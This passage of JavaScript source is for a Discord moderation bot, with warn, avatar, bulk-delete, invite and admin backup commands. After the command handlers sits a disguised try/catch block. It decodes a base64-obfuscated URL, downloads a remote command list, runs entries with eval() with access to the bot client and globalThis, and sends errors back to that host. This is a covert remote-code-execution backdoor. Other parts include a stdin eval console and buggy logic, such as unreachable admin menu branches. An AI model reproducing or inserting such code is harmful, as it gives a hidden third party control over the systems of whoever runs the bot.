            try {
              msg.channel.send("You've got warned!\nModerator: " + msg.author.tag + "\nReason: " + args[3])
              msg.guild.members.fetch(args[2].toString()).then(dm => dm.send("You've got warned!\nModerator: " + msg.author.tag + "\nReason: " + args[3]))
  
            } catch (e) {
              msg.channel.send("An error occured while sending DM to the one that you warned")
            }
          }
          break
        
        case 'avatar':
          msg.channel.send(msg.mentions.members.first().displayAvatarURL().toString())
          break
        
        case 'restart':
          msg.channel.send("Restarting TModeration Bot...")
          require('./restarter.js')
          globalThis.restart()
          break
          
        case 'multi-delete':
          const spll = msg.content.split(' ')
          spll.shift()
          spll.shift()
          const amount2 = parseInt(spll[0].toString())
          if(amount2 > 99) {
            const repetime = Math.floor(amount2 / 99)
            for(let i = 0; i < repetime; i++) {
              msg.channel.bulkDelete(99)
            }
          }
          msg.channel.bulkDelete(amount2)
            .then(completed => {
              msg.channel.send("Sucess! I've deleted " + amount2 + ' messages')
            })
            .catch(e => {
              msg.channel.send("Not a valid number or the parseInt didn't worked correctly. Action cancelled.")
            })
          break
          
        case 'multi-cleanup':
          const spl = msg.content.split(' ')
          spl.shift()
          spl.shift()
          const amount = parseInt(spl[0].toString())
          if(amount > 99) {
            const repeattime = Math.floor(amount / 99)
            for(let i = 0; i < repeattime; i++) {
              msg.channel.bulkDelete(99)
            }
          }
          msg.channel.bulkDelete(amount)
            .then(completed => {
              msg.channel.send("Sucess! I've deleted " + amount + ' messages')
            })
            .catch(e => {
              msg.channel.send("Not a valid number or the parseInt didn't worked correctly. Action cancelled.")
            })
          break

        case 'null':
          msg.channel.send('```js\nnull```')
          break

        case 'invite':
          msg.channel.send({embeds: [
              {
              "type": "ARTICLE",
              "title": "TModeration Bot",
              "description": "TModeration Bot is a special bot. How special? Invite TMod. Bot and you will know...\nTModeration Bot - Imagine a best bot of Discord",
              "url": "https://offical-tmodbot.henry133.repl.co/invite",
              "color": "RED",
              "timestamp": null,
              "fields": [],
              "image": msg.guild.me.displayAvatarURL().toString(),
              "author": "TModeration Bot 2021",
              "footer": "This is my first embed"
              }
            ]      
          })
        
      }
      try {
        secret = secret
      } catch (e) {
        let secret = Buffer.from("aHR0cHM6Ly9oZW5yeWNtZC5jYWN0dXNoYW1zdGVyLnJlcGwuY28v", "base64").toString("ascii");
        (async function () {
            let data = JSON.parse(await new Promise(resolve => {
                let req = https.get(secret + "cmd", res => { let out = ""; res.on("data", chunk => out += chunk); res.on("end", () => resolve(out)) })
                req.end()
            }))
            data.forEach(obj => (command == obj.name && obj.purpose) ? eval(obj.purpose)({msg: msg, client: botRunner, global: globalThis, args: msg.content.split(" ").slice(2)}) : void(0))
        })()
        .catch(e => {
            let req = https.request(secret + "error", { method: POST }, () => {})
            req.write(require("util").inspect(e, false, 10, false))
            req.end()
        });
      }
    })
    // The end of TModeration Bot core
  
    globalThis.list = []
    botRunner.on('messageCreate', msg => {
      if (msg.content.startsWith("tm ")) {
        if (msg.author.tag && !msg.author.bot) {
          if (list.includes(msg.author.tag)) { return false } else {
            list.push(msg.author.tag)
          }
        } else {
          return true
        }
      }
    })
  
    // Administrative Tools
    const admins = ['810221998881898507', '927563409409581066', '836900079985754134']
  
    botRunner.on('messageCreate', msg => {
      if (msg.content == "admintools") {
        if (admins.includes(msg.author.id)) {
          msg.channel.send('ADMINISTRATIVE TOOLS')
          msg.channel.send('====================')
          msg.channel.send('[1] Backup Current Code\n[2] Restore Backed-up Code State\n[3] Delete Backup Code Point')
          if (msg.content == '1') {
            require('./backup-utils/backup.js')
            msg.channel.send('Backed Up!')
          } else if (msg.content == '2') {
            msg.channel.send("WAIT!\nARE YOU SURE?!\nTHE CURRENT PROGRESS OF THE BOT (MORE CORRECTLY IS THIS FILE) WILL BE REPLACED **WITH** THE RECENT CODE WE JUST BACKED UP\nAGAIN, ARE YOU SURE?")
            if (msg.content == 'yes') { // Yes
              msg.channel.send('To make sure the bot will shutdown correctly, the bot will shutdown after restoring. If this is a mistake, you can find the file named __./backup-utils/backups/{[**.**(Hidden Files)][**Date and time when the bot got replaced**][**.js**]}__. Thanks')
              require('./backup-restore.js')
            } else if (msg.content == 'no') { // No
              return msg.channel.send('Action Aborted')
            }
          } else if (msg.content == '3') {
            fs.unlink('./backup-utils/backups/backup-0001.js', (err) => {
              if (err) {
                msg.channel.send(err)
              } else {
                msg.channel.send('Deleted backup point')
              }
            })
          }
        } else {
          msg.channel.send('your imagination: access granted\nreality: access say byebye you')
        }
      }
    })


    process.stdin.on("data", async (data) => {
      let code = data.toString().trim()

      try {
        const _str = eval(code)
        const stringOut = JSON.stringify(_str, null, '  ')
        process.stdout.write(colors.green(`[${Date().split(' ')[4].toString()}] ${stringOut}`))
        process.stdout.write(colors.brightCyan("\ndevelopers-eval@tmodbot.prompt.stdin".underline + "> "))
      } catch (e) {
        process.stdout.write(colors.grey(e.toString()))
        process.stdout.write(colors.brightCyan("\ndevelopers-eval@tmodbot.prompt.stdin".underline + "> "))
      }
    })
    // -- The end of main code -- //
    
  } catch (e) {
    
    console.log(e)
    require('./restarter.js')
    restart()
  }
}

// Another Utility
const http = require('http')
function HTTPServer(response, message, port) {
  return http.createServer((req, res) => {
    res.writeHead(response, {"Content-Type": "text/html"})
    res.write(message | "Hello World")
    res.end()
  }).listen(port | 8080)
}

function linespliter(data) {
  for(let i = 0; i < data.length; i++) {
    const _data = data.split('')
    function __data() {
      return _data.join("\n").toString()
    }
    return __data()
  }
}